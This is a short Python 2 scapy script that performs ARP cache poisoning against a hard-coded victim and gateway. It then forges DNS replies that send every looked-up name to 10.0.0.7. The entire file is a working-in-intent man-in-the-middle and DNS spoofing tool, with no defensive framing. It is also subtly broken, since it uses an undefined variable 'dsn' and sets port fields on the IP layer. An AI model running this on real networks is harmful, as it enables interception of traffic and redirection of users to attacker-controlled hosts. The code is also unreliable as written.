#!/usr/bin/env python

from scapy.all import *

def buildpkt(pkt):
	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
		ip = pkt.getlayer(IP)
		#udp = UDP()
		dns = pkt.getlayer(DNS)
		ip.src = pkt[IP].src
		ip.dst = pkt[IP].dst
		ip.sport = pkt[UDP].sport
		ip.dport = pkt[UDP].dport
		queryname = dns.qd.qname
		resp = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport = ip.dport)/DNS(id=dsn.id, qr=1, qd=dsn.qd, an=DNSRR(rrname=queryname, ttl=10, rdata="10.0.0.7"))
		print queryname
		print resp
		send(resp)

vIP="10.0.0.3"
vMAC = "00:11:32:0F:DC:A0"
gIP = "10.0.0.1"
gMAC = "E0:91:F5:D8:D2:FA"

#Sppof packets to the victim as if they copme from the gateway
vSPOOF = ARP()
vSPOOF.op=2
vSPOOF.psrc = gIP
vSPOOF.pdst = vIP
vSPOOF.hwdst = vMAC

#Spoof packets to the gateway as if the come from the victim
gSPOOF = ARP()
gSPOOF.op = 2
gSPOOF.psrc = vIP
gSPOOF.pdst = gIP
gSPOOF.hwdst = gMAC

print 'poisoning ARP of victim'
send(vSPOOF, count=1000)
send(gSPOOF, count=1000)

while 1:
	print 'sniffing for DNS packets'
	sniff(iface="eth0", count=1, filter="udp port 53", prn=buildpkt)
